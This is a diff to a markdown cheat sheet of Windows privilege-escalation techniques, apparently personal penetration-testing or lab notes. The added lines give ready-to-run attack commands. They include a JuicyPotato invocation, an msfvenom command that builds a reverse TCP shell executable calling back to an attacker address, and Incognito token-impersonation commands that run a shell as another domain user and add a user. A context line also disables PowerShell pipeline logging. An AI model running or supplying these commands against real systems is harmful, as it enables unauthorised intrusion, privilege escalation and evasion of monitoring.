@@ -843,8 +843,19 @@ $snap.LogPipelineExecutionDetails = $false
 	- [Potato family](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer)
 	- [Incognito.exe](https://medium.com/r3d-buck3t/domain-escalation-with-token-impersonation-bc577db55a0f)
 
+- **JUICYPOTATO**
+  - extract CLSID
+  - .\JuicyPotato.exe -p SCRIPT.bat -l 1234 -t * -c [{CLSID}](https://ohpe.it/juicy-potato/CLSID/)
+  - msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.87 LPORT=1234 -f exe -o privesc.exe
+
 #### Incognito
-.\incognito.exe execute -c "domain\user" C:\Windows\system32\cmd.exe
+[Tips](https://medium.com/r3d-buck3t/domain-escalation-with-token-impersonation-bc577db55a0f)
+
+
+- .\incognito.exe execute -c "domain\user" C:\Windows\system32\cmd.exe
+- .\incognito.exe list_tokens -u
+
+
 - Create user with admin:
 ```
 .\incognito add_user NAME PASS
